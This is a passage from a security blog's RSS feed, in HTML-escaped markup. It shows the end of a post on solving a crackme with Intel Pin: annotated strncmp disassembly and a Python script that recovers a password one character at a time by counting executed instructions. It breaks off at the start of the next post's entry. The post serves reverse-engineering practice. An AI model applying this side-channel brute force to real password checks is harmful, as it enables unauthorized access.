&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843df&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6239&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x1&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; if (counter == 1) goto 0xb7f843c3; // was this our last compare?&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843e2&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6242&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;je&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843c3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6211&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843e4&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6244&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;movzx&lt;/span&gt;  &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;BYTE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;	&lt;span style=&#34;color: #586E75&#34;&gt;; ecx = code[1];&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843e8&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6248&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;BYTE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; if (code[1] != argv[1][1]) goto 0xb7f843b0;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843eb&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6251&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;jne&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843b0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6192&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843ed&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6253&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; if (code[1] == 0) goto 0xb7f843c3; // have we reached the end of code?&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843ef&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6255&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;je&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843c3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6211&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843f1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6257&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x2&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843f4&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6260&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;je&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843c3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6211&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;; similar byte compares until the end&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f8453f&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6591&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f84541&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6593&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;je&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843c3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;621&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f84547&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6599&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xf&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f8454a&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6602&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;je&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843c3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;621&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f84550&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6608&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;movzx&lt;/span&gt;  &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;BYTE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xf&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f84554&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6612&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;BYTE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xf&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f84557&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6615&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;jne&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843b0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;619&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f8455d&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6621&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #586E75&#34;&gt;;	test   cl,cl&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We can see that the implementation has unrolled the for and compares 16 bytes one by one. If a character is correct, two more instructions are executed (as we saw) which are &lt;code&gt;test   cl,cl&lt;/code&gt; and &lt;code&gt;je     0xb7f843c3&lt;/code&gt; which basically checks if we have reached the end of first string. Now we know why. Let us build our tool.&lt;/p&gt;

&lt;h3 id=&#34;pinsolver-mk1:9d811092ed4116aee3518f2598b86e0b&#34;&gt;PinSolver Mk1&lt;/h3&gt;

&lt;p&gt;I am going to use Python&amp;rsquo;s subprocess module and reuse &lt;a href=&#34;http://parsiya.net/blog/2014-05-25-pasting-shellcode-into-gdb-using-python/&#34; target=&#34;_blank&#34;&gt;some old code&lt;/a&gt;. The script simply iterates through all valid characters (note: do not include space or some other special characters). For this example I am going to use alphanumeric characters. Character with the largest number of executed instructions will be chose and we move on to the next character.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;pinsolvermk1.py&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;subprocess&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Popen,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;PIPE&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# create a set of alphanumeric chars&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;alphanumeric&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;0123456789&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;abcdefghijklmnopqrstuvwxyz&amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;solution&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[]&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;False&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;True&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;

  &lt;span style=&#34;color: #93A1A1&#34;&gt;maxcount&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;candidate_char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;

  &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;alphanumeric:&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;# construct&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;fez&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;join(solution)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;char&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;proc&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Popen([&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;pin&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;-t&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;myins.so&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;--&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;./crkme1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;fez],&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;stdout&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;PIPE,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;stderr&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;PIPE)&lt;/span&gt;
  
    &lt;span style=&#34;color: #586E75&#34;&gt;# read output and split by lines&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;proc&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;stdout&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;read()&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;splitlines()&lt;/span&gt;
  
    &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(output[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Correct&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
      &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Code found: &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;join(solution)&lt;/span&gt;
      &lt;span style=&#34;color: #719e07&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(output[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;split(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;])&lt;/span&gt;
    
      &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(count&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;maxcount):&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;maxcount&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;count&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;candidate_char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;char&lt;/span&gt;
    
    &lt;span style=&#34;color: #586E75&#34;&gt;# print (&amp;quot;Trying %s - Count is: %d - Maxcount is: %d - Candidate_char is: %s&amp;quot;) % (fez, count, maxcount, candidate_char)&lt;/span&gt;
  
  &lt;span style=&#34;color: #586E75&#34;&gt;# after a loop has finished, add the chosen char to the solution&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;solution&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;append(candidate_char)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Note: If your VM has multiple CPUs this will not work. At this moment I do not know why.&lt;/p&gt;

&lt;p&gt;TODO in next chapter:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Try to find some simple crackmes2 from CTFs to run this tool on&lt;/li&gt;
&lt;li&gt;Find a way to increase pin&amp;rsquo;s performance&lt;/li&gt;
&lt;li&gt;Why is the instruction count not calculated correctly occasionally when VM has multiple CPUs?&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;As usual, if there is a any feedback please feel free to comment or contact me on Twitter. My handle is in the side bar &amp;mdash;-&amp;gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Building memfetch on Kali &#43; Comments</title>
      <link>http://parsiya.net/blog/2014-11-18-Building-memfetch-on-Kali--Comments/</link>
      <pubDate>Tue, 18 Nov 2014 23:21:01 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2014-11-18-Building-memfetch-on-Kali--Comments/</guid>
